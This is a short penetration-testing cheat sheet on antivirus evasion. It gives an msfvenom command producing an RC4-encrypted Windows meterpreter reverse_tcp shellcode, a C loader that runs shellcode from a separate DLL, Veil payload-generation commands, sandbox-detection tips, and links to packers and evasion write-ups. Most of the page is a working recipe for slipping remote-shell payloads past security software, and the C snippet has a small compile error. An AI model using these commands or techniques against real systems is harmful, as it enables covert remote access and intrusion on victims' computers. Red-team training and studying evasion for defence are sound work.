---
title: AV Evasion
category: Exploitation
order: 5
---

> **Encrypt: static**

{% highlight bash %}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c
{% endhighlight %}

> **Seperate the Shellcode from execution: dynamic**

{% highlight C %}
#include <iostream>
#include <Windows.h>

int main(void) {
  HMODULE hMod = LoadLibrary("shellcode.dll");
  if (hMod == nullptr) {
    cout << "Failed to load shellcode.dll" << endl;
  }

  return 0;
}
{% endhighlight %}

> **Veil** 

Show available Payloads | list
Information about Payload | info [payload]
Always: Clean State | clean
Select Payload | use [payload]
Show Options | options
Create Payload | generate
Output | /usr/share/veil-output/source

> **Syringe** 

https://github.com/securestate/syringe

> **Enigma Protector**

http://enigmaprotector.com/

> **Wrap the shellcode**

* Check for parent process 
* Check if you have been renamed from a long name

> **Write your own**

> **Other information**

* [Mimikatz](http://www.blackhillsinfosec.com/?p=5555)
* [Metasploit Templates and Veil](https://www.toshellandback.com/2015/09/30/anti-virus/)
* [Three Simple Disguises](https://www.blackhillsinfosec.com/three-simple-disguises-for-evading-antivirus/)
* [Metasploit Template](http://www.blackhillsinfosec.com/?p=4643)
* [Metasploit Encoding](https://pentestn00b.wordpress.com/2010/12/21/anti-virus-evasion-techniques/)
* [Rapid7 AV Evasion](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)
